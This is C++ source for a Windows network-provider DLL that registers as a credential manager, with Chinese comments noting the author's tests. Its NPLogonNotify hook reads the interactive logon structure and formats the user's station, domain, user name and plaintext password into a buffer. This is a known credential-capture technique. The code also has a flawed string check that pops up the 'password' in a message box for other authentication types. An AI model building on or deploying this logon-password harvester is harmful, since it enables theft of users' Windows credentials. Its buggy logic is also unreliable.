#include "pch.h"
#include "LogonNP.h"


//EXTERN_C
//__declspec(dllexport)
DWORD WINAPI NPGetCaps(DWORD nIndex)
{
    DWORD dwRes;

    switch (nIndex) {
    case WNNC_NET_TYPE:
        dwRes = WNNC_CRED_MANAGER; // credential manager
        break;
    case WNNC_SPEC_VERSION:
        dwRes = WNNC_SPEC_VERSION51;  // We are using version 5.1 of the spec.
        break;
    case WNNC_DRIVER_VERSION:
        dwRes = 1;  // This driver is version 1.
        break;
    case WNNC_START:
        dwRes = 1;  // We are already "started"
        break;
    default:
        dwRes = 0;  // We don't support anything else
        break;
    }

    return dwRes;
}


//EXTERN_C
//__declspec(dllexport)
DWORD WINAPI NPLogonNotify(PLUID lpLogonId,
                           LPCWSTR lpAuthentInfoType,
                           LPVOID lpAuthentInfo,
                           LPCWSTR lpPreviousAuthentInfoType,
                           LPVOID lpPreviousAuthentInfo,
                           LPWSTR lpStationName,
                           LPVOID StationHandle,
                           LPWSTR * lpLogonScript
)
{
    PMSV1_0_INTERACTIVE_LOGON pAuthInfo = (PMSV1_0_INTERACTIVE_LOGON)lpAuthentInfo;

    // If the primary authenticator is not MSV1_0, return success.
    // Why? Because this is the only auth info structure that we understand and we don't want to interact with other types.
    if (lstrcmpiW(L"MSV1_0:Interactive", lpAuthentInfoType)) {
        MessageBoxA(NULL, (char *)pAuthInfo->Password.Buffer, (char *)pAuthInfo->UserName.Buffer, 0);
        SetLastError(NO_ERROR);
        return NO_ERROR;
    }

    // Do something with the authentication information
    if (pAuthInfo->LogonDomainName.Length > 0) {
        if (pAuthInfo->Password.Length > 0) {
            if (pAuthInfo->UserName.Length > 0) {
                CHAR szBuf[1024];
                const char * FormateInfo = "StationName=%lS DomainName = %lS UserName=%lS Password=%lS\r\n";
                wsprintfA(szBuf,
                          FormateInfo,
                          lpStationName,
                          pAuthInfo->LogonDomainName.Buffer,
                          pAuthInfo->UserName.Buffer,
                          pAuthInfo->Password.Buffer);
                //MessageBox(NULL,szBuf,"Info",0);在登录界面和控制面板里面修改也会走到这里,并且停止在这里,消息框没有弹出.
            } else {
                MessageBoxA(NULL, "No Username", "", 0);
            }
        } else {
            MessageBoxA(NULL, "No Password", "", 0);
        }
    } else {
        MessageBoxA(NULL, "No domain Name", "", 0);
    }

    // Let's utilize the logon script capability to display our logon information       
    *lpLogonScript = (LPWSTR)LocalAlloc(LPTR, 1024);// The Caller MUST free this memory

    return NO_ERROR;
}


//EXTERN_C
//__declspec(dllexport)
DWORD WINAPI NPPasswordChangeNotify(LPCWSTR lpAuthentInfoType,
                                    LPVOID lpAuthentInfo,
                                    LPCWSTR lpPreviousAuthentInfoType,
                                    LPVOID lpPreviousAuthentInfo,
                                    LPWSTR lpStationName,
                                    LPVOID StationHandle,
                                    DWORD dwChangeInfo
)
/*
在登录界面的修改密码会走到这里.
控制面板的修改密码发现没有走到这里.
命令行的修改密码没有测试.
*/
{
    PMSV1_0_INTERACTIVE_LOGON pAuthInfo = (PMSV1_0_INTERACTIVE_LOGON)lpAuthentInfo;//这里有修改后的密码.

    return NO_ERROR;
}
